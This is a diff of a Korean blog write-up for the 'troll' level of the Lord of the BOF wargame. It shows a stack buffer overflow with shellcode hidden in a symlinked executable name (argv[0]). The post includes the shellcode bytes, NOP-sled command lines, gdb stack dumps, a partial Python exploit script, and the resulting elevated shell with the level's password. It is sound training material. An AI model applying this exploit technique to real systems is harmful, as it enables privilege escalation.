@@ -5,7 +5,7 @@ author: eli_ez3r
 key: 20180008
 category: write-up
 date: 2018-08-29 03:00:00 +0900
-modify_date: 2019-11-13
+modify_date: 2024-04-26
 article_header:
   type: cover
   image:
@@ -13,6 +13,9 @@ article_header:
 ---
 
 [+ Check argc](#){:.button.button--outline-success.button--pill}
+> orge / timewalker
+
+-----
 
 ```c
 /*
@@ -68,34 +71,63 @@ main(int argc, char *argv[])
 
 ### 0x01. Analysis
 
- argc의 개수를 2로 정해졌으므로, argv[2]를 사용 하지 못한다.
-
-buffer내용도 0으로 초기화 되며, argv[1]를 이용해서 argv[2]를 덮으려고 해도 길이가 48을 넘어 갈 수 없다.
-
+argc의 개수를 2로 정해졌으므로, argv[2]를 사용 하지 못한다.  
+buffer내용도 0으로 초기화 되며, argv[1]를 이용해서 argv[2]를 덮으려고 해도 길이가 48을 넘어 갈 수 없다.  
 그리고 argv[1]에 넣은 만큼 0으로 초기화 된다.
 
+- buffer 배열 크기 40byte
+- **프로그램 실행 인자가 2개인지 검증**
+- 환경변수 영역 0으로 초기화 (egghunter)
+- RET 첫 1byte '\xbf'로 시작
+- argv[1] 48byte 길이 미만
+- strcpy를 이용하여 argv[1] 인자 값을 buffer 배열로 복사
+- buffer 배열 40byte 0으로 초기화
+- **argv[1] 영역 0으로 초기화**
 
 
 트롤 맞네... 😩😫
 
+초기화가 안되는 영역은 argv[0]영역(실행파일 이름) 밖에 없다.  
+따라서 파일 이름에 shellcode를 넣어주어야 한다.
 
+<s>(여기서 파일 이름에 shellcode를 넣으면서 정상적으로 프로그램을 실행시키는 방법을 몰라 한참 삽질했다.)</s>
 
-초기화 안된 영역은 argv[0]영역(실행파일 이름) 밖에 없다.
+<br>
+파일 이름에 shellcode를 넣은 상태로 프로그램을 정상적으로 실행시키기 위해 <u>심볼릭 링크</u>[^1]를 이용하였다.
 
-따라서 파일 이름에 쉘코드를 넣어주어야 한다.
+심볼릭 링크를 이용하여 문제를 푸는 와중에 한동안 shellcode가 동작하지 않아 삽질을 계속하였다.  
+결국 이유를 찾았는데, 기존 사용하던 shellcode는 파일 이름에 넣기에 적절하지 않았다.
+
+> `\x2f`는 `/` 에 해당되는 Hex Code이다. 따라서 Shell Code에 `\x2f`가 들어가게 되면 심볼릭 링크하는 과정에서 `/`로 인식하게 된다.  
+> 디렉토리 경로를 나눌때 `/`를 이용하기 때문이다.
+
+따라서 아래 shellcode를 이용하여 문제를 풀었다.
+
+```
+'\x2f'없는 shell(48byte) = 
+\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81
+```
+
+<br>
 
 실제 스택에 올라가는 주소를 확인 하기 위해 `troll`파일을 `aroll`파일로 복사한 후 심볼릭 링크를 설정하였다.
 
-```
+```shell
 [orge@localhost orge]$ ln -s aroll `python -c 'print "A"*50+"S"*48+"A"*32'`
 ```
 
 - `A` : 앞 50byte, 뒤 32byte, NOP Code 들어갈 부분 (마지막에 NOP코드를 넣지 않는 경우 제대로 쉘코드가 실행 안되는 경우가 있다.)
--  `S` : 48byte ShellCode 들어갈 부분
+- `S` : 48byte ShellCode 들어갈 부분
+
+**왜 core 덤프로 확인할 때는 실제 NOP Code와 Shell Code를 넣지 않고 'A'와 'S'를 넣었을까?**  
+실제 NOP코드와 Shell Code를 넣어서 확인하다 보면 터미널에 글씨들이 깨지는 현상이 일어날 때가 있다. 이를 방지하기 위해 공간만 할당하고 일반적인 문자를 넣어 확인한 것이다.
+{:.info}
+
+<br>
 
 이제 만든 심볼릭 링크를 이용하여 실행하여 본다. (core를 생성하자)
 
-```
+```shell
 [orge@localhost orge]$ ./`python -c 'print "A"*50+"S"*48+"A"*32'` `python -c 'print "\x90"*44+"\xbf\xbf\xbf\xbf"'`
 릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱옜옜
 Segmentation fault (core dumped)
@@ -103,7 +135,7 @@ Segmentation fault (core dumped)
 
 core를 확인해보자.
 
-```
+```shell
 [orge@localhost orge]$ gdb -c core
 GNU gdb 19991004
 Copyright 1998 Free Software Foundation, Inc.
@@ -119,7 +151,7 @@ Program terminated with signal 11, Segmentation fault.
 
 RET에 정상적으로 `0xbfbfbfbf`가 들어간 것을 확인 할 수 있다.
 
-```
+```shell
 (gdb) x/100x $esp
 0xbffffc50:     0x000001fb      0x00000010      0x0f8bfbff      0x0000000f
 0xbffffc60:     0xbffffc8c      0x00000000      0x00000000      0x00000000
@@ -140,49 +172,37 @@ RET에 정상적으로 `0xbfbfbfbf`가 들어간 것을 확인 할 수 있다.
 (gdb)
 ```
 
-스택에서 argv[0]부분의 주소를 확인해보면 `0xbffffca0` 근처 부분에 `A`값들이 들어간 것을 확인 할 수있다.
-
+스택에서 argv[0]부분의 주소를 확인해보면 `0xbffffca0` 근처 부분에 `A`값들이 들어간 것을 확인 할 수 있다.  
 앞서 말한것 처럼 `A`가 들어가는 곳은 NOP Code가 들어가게 되고 `S`가 들어가는 곳은 Shell Code가 들어가는 공간이다.
 
-> 왜 core 덤프로 확인할 때는 실제 NOP Code와 Shell Code를 넣지 않고 'A'와 'S'를 넣었을까?
->
-> 실제 NOP코드와 Shell Code를 넣어서 확인하다 보면 터미널에 글씨들이 깨지는 현상이 일어날 때가 있다. 이를 방지하기 위해 공간만 할당하고 일반적인 문자를 넣어 확인한 것이다.
-
 주소를 확인하였으니 실제 `troll` 바이너리를 심볼릭 링크로 걸고 Exploit을 해보자.
-
-
-
-```
-'\x2f'없는 shell(48byte) = 
-\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81
-```
-
-> `\x2f`는 `/` 에 해당되는 Hex Code이다. 따라서 Shell Code에 `\x2f`가 들어가게 되면 심볼릭 링크하는 과정에서 `/`로 인식하게 된다. 디렉토리 경로를 나눌때 `/`를 이용하기 때문.
 
 -----
 
 ### 0x02. Exploit
 
 ```
+'\x2f'없는 shell(48byte) = 
+\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81
+```
+
+```shell
 [orge@localhost orge]$ ln -s troll `python -c 'print "\x90"*50+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80 \xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a \xe2\x9a\xb1\x0c\xce\x81"+"\x90"*32'`
 ```
+<br>
 
-이제 `A`와 `S`가 아닌 실제 Code들을 심볼릭 링크 이름으로 설정한다.
+설정한 심볼릭 링크 이름으로 troll바이너리를 실행한다.
 
-
-
-```
+```shell
 [orge@localhost orge]$ ./`python -c 'print "\x90"*50+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x 75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\x b1\x0c\xce\x81"+"\x90"*32'` `python -c 'print "\x90"*44+"\xa0\xfc\xff\xbf"'`
 릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱좢
-풺ash$ id
+bash$ id
 uid=507(orge) gid=507(orge) euid=508(troll) egid=508(troll) groups=507(orge)
 bash$ my-pass
 euid = 508
 aspirin
 bash$
 ```
-
-설정한 심볼릭 링크 이름으로 troll바이너리를 실행한다.
 
 buffer 배열의 40byte와 SFP 4byte를 NOP Code로 덮어씌우고 RET부분에 argv[0] 영역으로 설정하여 Shell Code가 실행되는 것을 확인할 수 있다.
 
@@ -248,7 +268,7 @@ sym_link = "\x90"*50 + shellcode + "\x90"*32
 shellcode_addr = 0xbffffc78
 
 if os.path.exists(sym_link):
-        os.remove(sym_link)
+    os.remove(sym_link)
 
 os.symlink('troll', sym_link)
 target = target + sym_link
@@ -263,4 +283,6 @@ if pid == 0:
 else:
         os.waitpid(pid, 0)
 ```
+-----
 
+[^1]: 링크를 연결하여 원본 파일을 직접 사용하는 것과 같은 효과를 내는 링크이다. 윈도우의 바로가기와 비슷한 개념 
